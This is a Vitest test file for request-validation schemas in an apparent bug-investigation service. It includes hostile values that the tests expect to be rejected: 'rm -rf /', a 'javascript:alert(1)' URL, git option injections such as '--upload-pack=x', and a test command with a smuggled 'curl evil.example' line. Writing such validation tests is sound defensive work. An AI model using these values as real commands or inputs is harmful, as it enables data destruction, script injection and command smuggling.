import { describe, expect, it } from "vitest";
import {
	CreateBugReportRequestSchema,
	CreateInvestigationRequestSchema,
	CreateRepositoryRequestSchema,
	CreateTokenRequestSchema,
	idSchema,
	LoginRequestSchema,
	NormalizationOutputSchema,
} from "../src/index.ts";

const ULID = "01JC9Z3K8Q5V7W2X4Y6Z8A0B1C";

describe("idSchema", () => {
	it("accepts a prefixed ULID", () => {
		expect(idSchema("inv").safeParse(`inv_${ULID}`).success).toBe(true);
	});

	it("rejects another prefix, lowercase, wrong length, and an empty suffix", () => {
		for (const value of [
			`bug_${ULID}`,
			`inv_${ULID.toLowerCase()}`,
			`inv_${ULID}X`,
			"inv_",
		]) {
			expect(idSchema("inv").safeParse(value).success).toBe(false);
		}
	});
});

describe("CreateBugReportRequestSchema", () => {
	it("accepts a minimal report and trims text", () => {
		const parsed = CreateBugReportRequestSchema.parse({
			title: "  Total shows NaN ",
			description: "Cart total is NaN",
		});
		expect(parsed.title).toBe("Total shows NaN");
	});

	it("rejects fields the client must not control", () => {
		for (const extra of [
			{ source_channel: "web" },
			{ command: "rm -rf /" },
			{ workspace_id: "wsp_x" },
		]) {
			expect(
				CreateBugReportRequestSchema.safeParse({
					title: "t",
					description: "d",
					...extra,
				}).success,
			).toBe(false);
		}
	});

	it("rejects non-http affected URLs", () => {
		const result = CreateBugReportRequestSchema.safeParse({
			title: "t",
			description: "d",
			affected_url: "javascript:alert(1)",
		});
		expect(result.success).toBe(false);
	});

	it("limits text evidence to 10 items of at most 200 KB", () => {
		const log = { kind: "stack_trace", content: "x" };
		expect(
			CreateBugReportRequestSchema.safeParse({
				title: "t",
				description: "d",
				logs: Array(11).fill(log),
			}).success,
		).toBe(false);
		expect(
			CreateBugReportRequestSchema.safeParse({
				title: "t",
				description: "d",
				logs: [{ ...log, content: "x".repeat(200_001) }],
			}).success,
		).toBe(false);
	});
});

describe("CreateInvestigationRequestSchema", () => {
	const base = { bug_report_id: `bug_${ULID}` };

	it("accepts branch names and SHAs", () => {
		for (const commit of ["bug/dashboard-aov", "3f2a9c1", "main"]) {
			expect(
				CreateInvestigationRequestSchema.safeParse({ ...base, commit }).success,
			).toBe(true);
		}
	});

	it("rejects option-like, range, and reflog commit expressions", () => {
		for (const commit of ["-c", "--upload-pack=x", "a..b", "HEAD@{1}", "a b"]) {
			expect(
				CreateInvestigationRequestSchema.safeParse({ ...base, commit }).success,
			).toBe(false);
		}
	});
});

describe("CreateRepositoryRequestSchema", () => {
	const valid = {
		name: "bench-shop",
		source: { type: "local_path", path: "D:/repos/bench-shop" },
		commands: { install: "npm ci --ignore-scripts", test: "npm test" },
	};

	it("accepts a local_path repository with single-line commands", () => {
		expect(CreateRepositoryRequestSchema.safeParse(valid).success).toBe(true);
	});

	it("rejects multi-line commands", () => {
		const result = CreateRepositoryRequestSchema.safeParse({
			...valid,
			commands: { ...valid.commands, test: "npm test\ncurl evil.example" },
		});
		expect(result.success).toBe(false);
	});
});

describe("CreateTokenRequestSchema", () => {
	it("requires explicit scopes for script tokens", () => {
		expect(
			CreateTokenRequestSchema.safeParse({ name: "ci", client_kind: "script" })
				.success,
		).toBe(false);
		expect(
			CreateTokenRequestSchema.safeParse({
				name: "ci",
				client_kind: "script",
				scopes: ["reports:read"],
			}).success,
		).toBe(true);
	});

	it("lets preset clients omit scopes", () => {
		expect(
			CreateTokenRequestSchema.safeParse({ name: "laptop", client_kind: "mcp" })
				.success,
		).toBe(true);
	});
});

describe("LoginRequestSchema", () => {
	it("normalizes email case and whitespace", () => {
		expect(
			LoginRequestSchema.parse({
				email: " Founder@Example.COM ",
				password: "long-enough",
			}).email,
		).toBe("founder@example.com");
	});
});

describe("NormalizationOutputSchema", () => {
	const output = {
		title: "Cart total shows NaN after discount",
		summary: "Applying SAVE10 makes the cart total NaN.",
		expected_behavior: "A numeric total",
		actual_behavior: "Total shows NaN",
		steps: ["Add two mugs", "Apply SAVE10"],
		environment: {
			browser: "Chrome",
			os: "macOS",
			viewport: null,
			app_version: null,
		},
		affected_page: "/cart",
		severity_suggestion: "unknown",
		suspected_components: ["cart total calculation"],
		search_terms: ["SAVE10", "NaN"],
		ui_element_phrases: ["cart total"],
		screenshot_observations: [],
		unresolved_questions: [
			{ question: "Which version?", why_it_matters: "Regression window" },
		],
		field_basis: [{ field: "expected_behavior", basis: "inferred" }],
	};

	it("parses a complete model output", () => {
		expect(NormalizationOutputSchema.parse(output).steps).toHaveLength(2);
	});

	it("rejects an unknown severity", () => {
		expect(
			NormalizationOutputSchema.safeParse({
				...output,
				severity_suggestion: "urgent",
			}).success,
		).toBe(false);
	});
});
